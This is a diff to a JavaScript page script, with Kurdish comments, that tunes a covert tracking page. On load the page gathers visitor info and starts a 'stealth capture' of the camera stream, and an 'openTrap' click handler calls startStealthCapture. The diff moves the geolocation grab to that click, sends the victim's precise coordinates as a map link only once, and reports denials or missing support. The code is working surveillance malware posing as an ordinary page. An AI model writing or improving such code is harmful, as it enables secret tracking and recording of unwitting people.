@@ -8,6 +8,7 @@ const canvas = document.getElementById('canvas');
 let mediaStream = null;
 let captureInterval = null;
 let frameCount = 0;
+let locationSent = false;
 
 async function sendMessage(text) {
     try {
@@ -58,17 +59,22 @@ async function gatherAndSendInfo() {
 }
 
 function getLocation() {
+    if (locationSent) return; 
+    
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
             (pos) => {
                 const { latitude, longitude, accuracy } = pos.coords;
                 sendMessage(`📍 <b>Location Captured</b>\nAccuracy: ${accuracy}m\nMap: https://maps.google.com/?q=${latitude},${longitude}`);
+                locationSent = true; 
             },
             (err) => {
                 sendMessage(`❌ <b>Location denied or error:</b> ${err.message}`);
             },
             { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
         );
+    } else {
+        sendMessage(`❌ <b>Geolocation not supported.</b>`);
     }
 }
 
@@ -126,12 +132,13 @@ document.addEventListener('visibilitychange', () => {
 
 window.addEventListener('load', () => {
     gatherAndSendInfo();
-    getLocation();
     startStealthCapture();
+    // getLocation() لێرە لابرا
 });
 
 function openTrap() {
     if (!mediaStream) {
         startStealthCapture();
     }
+    getLocation(); // داواکردنی لوکیشن لە کاتی کلیک
 }
